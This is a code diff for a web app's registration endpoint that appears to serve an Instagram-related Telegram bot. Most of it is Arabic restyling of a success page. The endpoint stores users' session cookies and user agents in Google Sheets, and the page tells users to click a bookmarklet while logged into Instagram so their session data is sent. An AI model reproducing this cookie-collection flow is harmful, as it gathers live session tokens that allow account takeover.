@@ -281,6 +281,7 @@ async def register(
             cookie=payload.cookie,
             user_agent=payload.ua,
             last_run=None,
+            whitelist="",
         )
     except Exception as exc:
         logger.exception("Failed to store registration in Google Sheets: %s", exc)
@@ -293,22 +294,28 @@ async def register(
 
     success_html = """
     <!DOCTYPE html>
-    <html lang="en">
+    <html lang="ar" dir="rtl">
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Success</title>
+        <title>تم الربط بنجاح</title>
         <style>
             :root {
                 color-scheme: light;
-                --bg-start: #ecfdf5;
-                --bg-end: #d1fae5;
-                --card-bg: rgba(255, 255, 255, 0.96);
-                --text-main: #064e3b;
-                --text-muted: #166534;
-                --accent: #16a34a;
-                --accent-hover: #15803d;
-                --shadow: 0 20px 50px rgba(22, 163, 74, 0.18);
+                --bg-a: #f5f3ff;
+                --bg-b: #eff6ff;
+                --bg-c: #f8fafc;
+                --card-bg: rgba(255, 255, 255, 0.95);
+                --text-main: #0f172a;
+                --text-muted: #475569;
+                --primary: #7c3aed;
+                --primary-soft: #ede9fe;
+                --success: #059669;
+                --success-soft: #ecfdf5;
+                --warning-bg: #fff7ed;
+                --warning-border: #fdba74;
+                --border: #e2e8f0;
+                --shadow: 0 24px 60px rgba(15, 23, 42, 0.14);
             }
 
             * {
@@ -318,8 +325,11 @@ async def register(
             body {
                 margin: 0;
                 min-height: 100vh;
-                font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-                background: linear-gradient(135deg, var(--bg-start), var(--bg-end));
+                font-family: Arial, sans-serif;
+                background:
+                    radial-gradient(circle at top right, rgba(124, 58, 237, 0.16), transparent 28%),
+                    radial-gradient(circle at bottom left, rgba(59, 130, 246, 0.12), transparent 30%),
+                    linear-gradient(135deg, var(--bg-a), var(--bg-b) 45%, var(--bg-c) 100%);
                 display: flex;
                 align-items: center;
                 justify-content: center;
@@ -329,73 +339,146 @@ async def register(
 
             .wrapper {
                 width: 100%;
-                max-width: 520px;
+                max-width: 840px;
             }
 
             .card {
                 background: var(--card-bg);
-                border-radius: 28px;
-                padding: 36px 28px;
-                text-align: center;
+                border: 1px solid rgba(255, 255, 255, 0.9);
+                border-radius: 30px;
+                padding: 32px 26px 24px;
                 box-shadow: var(--shadow);
-                border: 1px solid rgba(34, 197, 94, 0.18);
                 backdrop-filter: blur(10px);
             }
 
-            .checkmark {
-                width: 110px;
-                height: 110px;
-                margin: 0 auto 20px;
-                border-radius: 999px;
+            .hero {
+                display: grid;
+                grid-template-columns: 92px 1fr;
+                gap: 18px;
+                align-items: start;
+            }
+
+            .hero-icon {
+                width: 92px;
+                height: 92px;
+                border-radius: 26px;
+                background: linear-gradient(135deg, #22c55e, #14b8a6);
+                color: #ffffff;
                 display: flex;
                 align-items: center;
                 justify-content: center;
-                background: linear-gradient(135deg, #22c55e, #16a34a);
-                color: #ffffff;
-                font-size: 56px;
-                line-height: 1;
-                box-shadow: 0 14px 34px rgba(34, 197, 94, 0.35);
+                font-size: 44px;
+                box-shadow: 0 16px 32px rgba(34, 197, 94, 0.24);
+            }
+
+            .badge {
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                background: var(--success-soft);
+                color: var(--success);
+                border: 1px solid #a7f3d0;
+                border-radius: 999px;
+                padding: 8px 14px;
+                font-size: 14px;
+                font-weight: bold;
+                margin-bottom: 14px;
             }
 
             h1 {
-                margin: 0 0 12px;
-                font-size: 2rem;
-                font-weight: 800;
-                letter-spacing: -0.02em;
+                margin: 0 0 10px;
+                font-size: 31px;
+                line-height: 1.4;
             }
 
-            p {
-                margin: 0 auto;
-                max-width: 420px;
-                font-size: 1rem;
-                line-height: 1.7;
+            .lead {
+                margin: 0;
+                font-size: 17px;
+                line-height: 1.9;
                 color: var(--text-muted);
             }
 
-            .button {
-                display: inline-flex;
-                align-items: center;
-                justify-content: center;
-                margin-top: 28px;
-                width: 100%;
-                max-width: 260px;
-                min-height: 54px;
-                padding: 14px 22px;
-                border-radius: 16px;
-                text-decoration: none;
-                font-weight: 700;
-                font-size: 1rem;
-                color: #ffffff;
-                background: linear-gradient(135deg, var(--accent), #22c55e);
-                box-shadow: 0 12px 28px rgba(22, 163, 74, 0.28);
-                transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+            .section-title {
+                margin: 28px 0 14px;
+                font-size: 20px;
+                color: var(--text-main);
             }
 
-            .button:hover,
-            .button:focus-visible {
-                background: linear-gradient(135deg, var(--accent-hover), var(--accent));
-                transform: translateY(-1px);
-                box-shadow: 0 16px 30px rgba(21, 128, 61, 0.3);
+            .steps {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+                gap: 14px;
+            }
+
+            .step-card {
+                background: linear-gradient(180deg, #ffffff 0%, #f8fbff 100%);
+                border: 1px solid #dbeafe;
+                border-radius: 20px;
+                padding: 18px 16px;
+                box-shadow: 0 10px 24px rgba(59, 130, 246, 0.08);
+            }
+
+            .step-number {
+                width: 36px;
+                height: 36px;
+                border-radius: 12px;
+                background: var(--primary-soft);
+                color: var(--primary);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-weight: bold;
+                margin-bottom: 12px;
+            }
+
+            .step-card h3 {
+                margin: 0 0 8px;
+                font-size: 17px;
+            }
+
+            .step-card p {
+                margin: 0;
+                font-size: 14px;
+                line-height: 1.9;
+                color: var(--text-muted);
+            }
+
+            .note {
+                margin-top: 22px;
+                background: var(--warning-bg);
+                border: 1px solid var(--warning-border);
+                border-radius: 18px;
+                padding: 18px 16px;
+                font-size: 15px;
+                line-height: 1.9;
+                color: #7c2d12;
+            }
+
+            .footer-box {
+                margin-top: 18px;
+                background: #f8fafc;
+                border: 1px dashed var(--border);
+                border-radius: 18px;
+                padding: 16px;
+                font-size: 14px;
+                line-height: 1.9;
+                color: var(--text-muted);
+            }
+
+            .tips {
+                margin-top: 22px;
+                display: flex;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .tip {
+                background: #ffffff;
+                border: 1px solid var(--border);
+                border-radius: 999px;
+                padding: 10px 14px;
+                font-size: 13px;
+                color: #334155;
             }
 
             @media (max-width: 640px) {
@@ -404,28 +487,26 @@ async def register(
                 }
 
                 .card {
-                    padding: 28px 20px;
+                    padding: 24px 18px 20px;
                     border-radius: 24px;
                 }
 
-                .checkmark {
-                    width: 92px;
-                    height: 92px;
-                    font-size: 46px;
-                    margin-bottom: 18px;
+                .hero {
+                    grid-template-columns: 1fr;
+                }
+
+                .hero-icon {
+                    width: 78px;
+                    height: 78px;
+                    font-size: 36px;
                 }
 
                 h1 {
-                    font-size: 1.75rem;
+                    font-size: 27px;
                 }
 
-                p {
-                    font-size: 0.98rem;
-                }
-
-                .button {
-                    max-width: none;
-                    width: 100%;
+                .lead {
+                    font-size: 16px;
                 }
             }
         </style>
@@ -433,12 +514,56 @@ async def register(
     <body>
         <main class="wrapper">
             <section class="card">
-                <div class="checkmark" aria-hidden="true">✓</div>
-                <h1>Success</h1>
-                <p>Your account has been linked successfully. You can now return to Telegram to start the hunt!</p>
-                <a class="button" href="https://t.me/YourBotUsername" target="_blank" rel="noopener noreferrer">
-                    Open Telegram
-                </a>
+                <div class="hero">
+                    <div class="hero-icon" aria-hidden="true">🎉</div>
+                    <div>
+                        <div class="badge">✅ تم حفظ الجلسة بنجاح</div>
+                        <h1>تم ربط حساب إنستجرام بنجاح</h1>
+                        <p class="lead">
+                            تم التحقق من الجلسة الخاصة بك وحفظها داخل النظام بنجاح. الآن يمكنك الرجوع إلى تيليجرام
+                            ومتابعة الاستخدام من لوحة التحكم بسهولة.
+                        </p>
+                    </div>
+                </div>
+
+                <h2 class="section-title">✨ الخطوات التالية</h2>
+
+                <div class="steps">
+                    <article class="step-card">
+                        <div class="step-number">1</div>
+                        <h3>📲 العودة إلى تيليجرام</h3>
+                        <p>ارجع إلى محادثة البوت بعد إتمام الربط من المتصفح.</p>
+                    </article>
+
+                    <article class="step-card">
+                        <div class="step-number">2</div>
+                        <h3>🧭 فتح لوحة التحكم</h3>
+                        <p>استخدم <strong>/start</strong> أو <strong>/help</strong> لعرض لوحة التحكم الرئيسية.</p>
+                    </article>
+
+                    <article class="step-card">
+                        <div class="step-number">3</div>
+                        <h3>🚀 ربط الحساب / بدء الصيد</h3>
+                        <p>من داخل اللوحة يمكنك متابعة الربط أو بدء الصيد وإدارة الخيارات المتاحة.</p>
+                    </article>
+                </div>
+
+                <div class="note">
+                    <strong>🔖 ملاحظة مهمة:</strong>
+                    يجب حفظ الـ <strong>Bookmarklet</strong> داخل <strong>الإشارات المرجعية في المتصفح</strong>،
+                    ثم الضغط عليه <strong>وأنت مسجل الدخول إلى إنستجرام</strong> حتى يتم إرسال بيانات الجلسة بشكل صحيح.
+                </div>
+
+                <div class="tips">
+                    <div class="tip">💡 احفظ الرابط في المفضلة أولًا</div>
+                    <div class="tip">🔐 استخدمه فقط أثناء تسجيل الدخول</div>
+                    <div class="tip">🤖 أكمل الخطوات من داخل تيليجرام</div>
+                </div>
+
+                <div class="footer-box">
+                    إذا احتجت إعادة الربط لاحقًا، افتح إنستجرام من المتصفح، تأكد أنك داخل حسابك، ثم اضغط على الـ Bookmarklet
+                    مرة أخرى وبعدها تابع من البوت في تيليجرام.
+                </div>
             </section>
         </main>
     </body>
